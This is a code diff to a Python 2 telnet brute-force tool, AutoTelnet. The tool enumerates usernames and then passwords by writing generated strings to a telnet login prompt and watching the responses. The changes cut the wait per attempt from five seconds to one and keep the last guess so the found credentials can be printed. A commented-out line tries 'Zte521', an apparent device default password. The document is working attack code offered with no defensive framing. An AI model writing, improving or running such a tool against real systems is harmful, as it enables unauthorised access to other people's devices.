@@ -17,8 +17,8 @@ class AutoTelnet:
 		self.host = host
 		self.timeout = 2
 		self.command_promt = "$ "
-		self.passwd = ""
-		self.user = ""
+		self.passwd = ["",""]
+		self.user = ["",""]
 		self.telnet = ""
 		self.L_prompt = L_prompt
 		self.P_prompt = P_prompt
@@ -58,7 +58,7 @@ class AutoTelnet:
 		#User Bruteforce
 		for i in range(len(string.lowercase)):
 			st = self.generate(string.lowercase,i+1)
-			#st = self.generate("rot",4)
+			#st = self.generate("rotasdf",4)
 			self.connexion()
 			self.excepcion = False
 			self.test_counter =0
@@ -71,12 +71,13 @@ class AutoTelnet:
 						self.connexion()
 						self.test_counter = 0
 					try:
-						self.user = st.next()
-						print self.user
-						self.telnet.write("%s\n" %self.user)
+						self.user[1] = self.user[0]
+						self.user[0] = st.next()
+						print self.user[1]
+						self.telnet.write("%s\n" %self.user[0])
 						self.test_counter += 1
 						#self.telnet.write("root\n")
-						n, match, previous_text = self.telnet.expect([self.L_prompt], 5)
+						n, match, previous_text = self.telnet.expect([self.L_prompt], 1)
 						if n < 0:
 							print "User found"
 							self.user_found = True
@@ -86,14 +87,16 @@ class AutoTelnet:
 			except:
 				pass
 					
-		print self.user
+		print self.user[1]
 		#pass bruteforce
-		self.test_counter =0	
+		self.test_counter = 0	
+		#exit()
 		for i in range(len(string.letters+string.digits)):
 			st = self.generate(string.letters+string.digits,i+1)
+			#st = self.generate("Zte521",6)
 			self.connexion()
 			response = self.telnet.read_until(login_prompt, 1)
-			self.telnet.write("%s\n" %self.user)
+			self.telnet.write("%s\n" %self.user[1])
 			#self.telnet.write("root\n")
 			self.excepcion = False
 			
@@ -107,14 +110,15 @@ class AutoTelnet:
                                         if self.test_counter >= len(string.lowercase):
                                                 self.connexion()
 						response = self.telnet.read_until(login_prompt, 1)
-						self.telnet.write("%s\n" %self.user)
+						self.telnet.write("%s\n" %self.user[1])
                                                 self.test_counter = 0
 					try:
-						self.passwd = st.next()
-						print self.passwd
-						self.telnet.write("%s\n" %self.passwd)
+						self.passwd[1] = self.passwd[0]
+						self.passwd[0] = st.next()
+						print self.passwd[1]
+						self.telnet.write("%s\n" %self.passwd[0])
 						self.test_counter += 1
-						n, match, previous_text = self.telnet.expect([self.P_prompt], 5)
+						n, match, previous_text = self.telnet.expect([self.P_prompt], 1)
 						if n < 0:
 							print "Password found"
 							self.pass_found = True
@@ -122,7 +126,7 @@ class AutoTelnet:
 						print "excepcion"
 						self.excepcion = True
 			except:
-				print "pasando"
+				#print "pasando"
 				pass
 
 			self.telnet.close()
@@ -164,5 +168,5 @@ if __name__ == '__main__':
 	#BruteForce
 	autoTelnet.brute_force()
 	#Found
-	print "User: "+self.user
-	print "Pass: "+self.passwd
+	print "User: "+autoTelnet.user[1]
+	print "Pass: "+autoTelnet.passwd[1]
